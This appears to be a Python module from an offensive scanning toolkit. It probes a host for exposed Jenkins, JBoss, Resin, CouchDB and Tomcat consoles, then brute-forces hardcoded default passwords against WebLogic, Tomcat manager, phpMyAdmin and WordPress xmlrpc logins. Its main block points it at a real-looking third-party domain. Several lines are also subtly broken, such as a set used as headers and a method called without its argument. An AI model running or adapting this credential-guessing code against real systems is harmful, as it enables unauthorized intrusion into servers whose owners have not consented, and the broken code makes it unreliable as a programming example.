# coding=utf-8

from Exploit.BaseExploit import *
from threading import Thread
import requests
import base64
requests.packages.urllib3.disable_warnings()

abs_path = os.getcwd() + os.path.sep


class HttpUnauth(Exploit):
    def __init__(self, domain, http):
        super().__init__()
        self.httpunauthlist = list()
        self.domain = domain
        #  默认http头
        self._http = http.replace('\n', '') if http.startswith('http') else 'http://' + http.replace('\n', '')
        self.user_list = ['root', 'admin']
        self.password_list = ['root', 'sa', 'admin', 'test', 'mysql', '123456', 'admin1234', 'admin12345', '000000', '987654321', '1234', '12345']
        self.headers = {
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"
        }

    def write_file(self, web_lists, target, page):
        workbook = openpyxl.load_workbook(os.getcwd() + os.path.sep + str(target) + ".xlsx")
        worksheet = workbook.worksheets[page]  # 打开的是证书的sheet
        worksheet.append(web_lists)
        workbook.save(os.getcwd() + os.path.sep + str(target) + ".xlsx")
        workbook.close()

    def exploit(self, url_list):

        try:
            rr = requests.get(url=str(self._http + '/_config'), headers=self.headers, timeout=5)
            if "couch" in rr.content:
                self.httpunauthlist.append('CouchDB未授权访问漏洞:' + rr.url.strip('/'))
                # with open('result.txt', 'a+')as aaa:
                #     aaa.write('CouchDB未授权访问漏洞:' + rr.url.strip('/') + '\n')
        except:
            pass

        try:
            r_ = []
            r1 = self._http + '/script'
            r3 = self._http + ':8080/script'
            r_.append(r1)
            r_.append(r3)
            for r_r in r_:
                try:
                    print(r_r)

                    rxr = requests.get(url=r_r, headers=self.headers, timeout=8)
                    if 'arbitrary' in rxr.content:
                        self.httpunauthlist.append('Jenkins未授权访问漏洞:' + rxr.url.strip('/'))
                        # with open('result.txt', 'a+')as aaa:
                        #     aaa.write('Jenkins未授权访问漏洞:' + rxr.url.strip('/') + '\n')
                except:
                    pass
        except:
            pass

        try:
            rrr = requests.get(url=str(self._http + '/servlets-examples/'), headers=self.headers, timeout=5)
            if 'servlet/RequestParamExample' in rrr.content:
                self.httpunauthlist.append('Tomcat example 应用信息泄漏漏洞:' + rrr.url.strip('/'))
                # with open('result.txt', 'a+')as aaa:
                #     aaa.write('Tomcat example 应用信息泄漏漏洞:' + rrr.url.strip('/') + '\n')
        except:
            pass

        try:
            r_ = []
            r1 = self._http + '/resin-doc/admin/index.xtp'
            r3 = self._http + ':8080/resin-doc/admin/index.xtp'
            r5 = self._http + ':8443/resin-doc/admin/index.xtp'
            r_.append(r1)
            r_.append(r3)
            r_.append(r5)
            for r_r in r_:
                try:
                    print(r_r)

                    rxr = requests.get(url=r_r, headers=self.headers, timeout=8)
                    if '/resin-doc/examples/index.xtp' in rxr.content:
                        self.httpunauthlist.append('Resin viewfile远程文件读取漏洞:' + r_r)
                        # with open('result.txt', 'a+')as aaa:
                        #     aaa.write('Resin viewfile远程文件读取漏洞:' + r_r + '\n')
                except:
                    pass
        except:
            pass

        try:
            r_ = []
            r1 = self._http + '/jmx-console/'
            r3 = self._http + ':8080/jmx-console/'
            r_.append(r1)
            r_.append(r3)
            for r_r in r_:
                try:
                    print(r_r)

                    rxr = requests.get(url=r_r, headers=self.headers, timeout=8)
                    if 'flavor=URL,type=DeploymentScanner' in rxr.content:
                        self.httpunauthlist.append('JBoss后台上传漏洞:' + r_r)
                        # with open('result.txt', 'a+')as aaa:
                        #     aaa.write('JBoss后台上传漏洞:' + r_r + '\n')
                except:
                    pass
        except:
            pass

        try:
            r_ = []
            r1 = self._http + '/console/login/LoginForm.jsp'
            r3 = self._http + ':7001/console/login/LoginForm.jsp'
            r7 = self._http + ':7002/console/login/LoginForm.jsp'
            r_.append(r1)
            r_.append(r3)
            r_.append(r7)
            for r_r in r_:
                try:
                    print(r_r)
                    for uuser in self.user_list:
                        for ppass in self.password_list:
                            data = {'j_username': str(uuser), 'j_password': str(ppass),
                                    'j_character_encoding': 'GBK'}
                            rxr = requests.post(url=r_r, data=data, headers=self.headers, timeout=8)
                            if 'WebLogic Server Console' in rxr.content:
                                self.httpunauthlist.append('Weblogic弱口令漏洞:' + r_r + ':' + uuser + '|' + ppass)
                                # with open('result.txt', 'a+')as aaa:
                                #     aaa.write('Weblogic弱口令漏洞:' + r_r + ':' + uuser + '|' + ppass + '\n')
                except:
                    pass
        except:
            pass

        try:
            r_ = []
            r1 = self._http + '/RetainServer/Manager/login.jsp'
            r2 = self._http + '/Manager/login.jsp'
            r3 = self._http + ':8080/Manager/login.jsp'
            r4 = self._http + ':8080/RetainServer/Manager/login.jsp'
            r_.append(r1)
            r_.append(r2)
            r_.append(r3)
            r_.append(r4)
            for r_r in r_:
                try:
                    print(r_r)
                    rxr = requests.get(url=r_r, headers=self.headers, timeout=10)
                    if 'onkeypress="if(event.keyCode==13)' in rxr.content:
                        for uuser in self.user_list:
                            for ppass in self.password_list:
                                data = {'login': str(uuser), 'pass': str(ppass), 'Language': 'myLang'}
                                try:
                                    r_br = requests.post(url=r_r, data=data, headers=self.headers, timeout=10)
                                    if 'Router Configuration' in r_br.content:
                                        self.httpunauthlist.append('Tomcat远程部署弱口令:' + r_r + ':' + uuser + '|' + ppass )
                                except:
                                    pass
                except:
                    pass
        except:
            pass

        try:
            r_ = []
            r2 = self._http + '/manager/html'
            r1 = self._http + ':8080/manager/html'
            r3 = self._http + ':8081/manager/html'
            r_.append(r1)
            r_.append(r3)
            for r_r in r_:
                try:
                    print(r_r)
                    rxr = requests.get(url=r_r, headers=self.headers, timeout=5)
                    if 'Manager App HOW-TO' in rxr.content:
                        for uuser in self.user_list:
                            for ppass in self.password_list:
                                headers = {'Authorization': 'Basic %s==' % base64.b64encode((uuser + ':' + ppass).encode()).decode()}
                                try:
                                    rxrx = requests.get(url=r_r, headers=headers, timeout=8)
                                    if rxrx.status_code == 200:
                                        self.httpunauthlist.append('Tomcat后台管理弱口令:' + r_r + ':' + uuser + '|' + ppass)
                                        # with open('result.txt', 'a+')as aaa:
                                        #     aaa.write('Tomcat后台管理弱口令:' + r_r + ':' + uuser + '|' + ppass + '\n')
                                except:
                                    pass
                except:
                    pass
        except:
            pass

        try:
            flag_list = ['<name>isAdmin</name>', '<name>url</name>']
            for uuser in self.user_list:
                for ppass in self.password_list:
                    try:
                        login_path = '/xmlrpc.php'
                        PostStr = "<?xml version='1.0' encoding='iso-8859-1'?><methodCall>  " \
                                  "<methodName>wp.getUsersBlogs</methodName>  <params>   " \
                                  "<param><value>%s</value></param>   <param><value>%s</value></param>  " \
                                  "</params></methodCall>" % (uuser, ppass)
                        resp = requests.get(url=self._http + login_path, headers=self.headers, data=PostStr)
                        content = resp.text()
                        for flag in flag_list:
                            if flag in content:
                                self.httpunauthlist.append('Wordpress弱口令:' + self._http + login_path + ':' + uuser + '|' + ppass)
                    except:
                        pass
        except:
            pass

        # phpMyAdmin弱口令漏洞
        try:
            r_ = []
            r1 = self._http + '/phpmyadmin/index.php'
            r2 = self._http + ':999/phpmyadmin/index.php'
            r4 = self._http + ':8080/phpmyadmin/index.php'
            r_.append(r1)
            r_.append(r2)
            r_.append(r4)
            for r_r in r_:
                try:
                    rxr = requests.get(url=r_r, timeout=10)
                    if 'Documentation.html' in rxr.content:
                        for uuser in self.user_list:
                            for ppass in self.password_list:
                                data = {'pma_username': str(uuser), 'pma_password': str(ppass)}
                                try:
                                    r_br = requests.post(url=r_r, data=data, timeout=10)
                                    if 'mainFrameset' in r_br.content:
                                        self.httpunauthlist.append('phpMyAdmin弱口令:' + r_r + ':' + uuser + '|' + ppass)
                                        # with open('result.txt', 'a+')as aaa:
                                        #     aaa.write('PHPmyadmin弱口令:' + r_r + ':' + uuser + '|' + ppass + '\n')
                                except:
                                    pass
                    else:
                        pass
                except:
                    pass
        except:
            pass

    def main(self):
        self.exploit()
        self.write_file(self.httpunauthlist, self.domain, 9)


if '__main__' == __name__:
    http_list = ['www.nbcc.cn']
    thread_list = list()

    for i in http_list:
        xxx = HttpUnauth('nbcc.cn', i)
        thread_list.append(Thread(target=xxx.main))

    for i in thread_list:
        i.start()

    for i in thread_list:
        i.join()





